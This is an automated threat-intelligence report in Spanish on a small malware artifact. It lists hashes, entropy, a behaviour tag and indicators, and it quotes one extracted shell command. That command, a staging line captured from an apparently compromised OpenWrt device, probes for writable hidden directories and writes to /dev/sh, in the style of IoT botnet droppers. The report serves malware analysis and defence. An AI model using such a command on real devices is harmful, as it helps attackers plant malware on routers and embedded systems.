# 🧬 Payload Analysis

`8566954c57377a8f385b99a16b6dcd17ff46984ec7496f0601c7359eff1961bd`

## 📌 Resumen

Artefacto de 1.2 KiB. Entropía registrada: 5.60. No existe evidencia suficiente para atribuir este artefacto a una familia concreta. Comportamientos destacados: Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 2 indicadores técnicos.


## 🗓️ Registro

- **Registrado:** `2026-08-09T19:49:46.000000Z`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `8566954c57377a8f385b99a16b6dcd17ff46984ec7496f0601c7359eff1961bd`
- **SHA1:** `e953e7945f673bb1b8a59e373a30ed9789c82d86`
- **MD5:** `257a1de254f9ef11efb6fbc2d05953b8`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | data |
| Tamaño | 1.2 KiB |
| Entropía | 5.6 |
| Strings | 25 |

## 🧠 Comportamiento observado

1. **Ejecución**

## 🔬 Evidencia de clasificación

- Motivos técnicos: mime=data; iocs=2

## 🖥️ Comandos observados / extraídos

```text
[4lTMAR#DLKT20060205@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/sh
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| command | [4lTMAR#DLKT20060205@OpenWrt:~$ >/var/run/.x&&cd /var/run;>/mnt/.x&&cd /mnt;>/usr/.x&&cd /usr;>/dev/.x&&cd /dev;>/dev/sh | strings |
| hash | 8566954c57377a8f385b99a16b6dcd17ff46984ec7496f0601c7359eff1961bd | static_analysis |
| ip | [internal-ip-redacted] | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | unsupported format |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
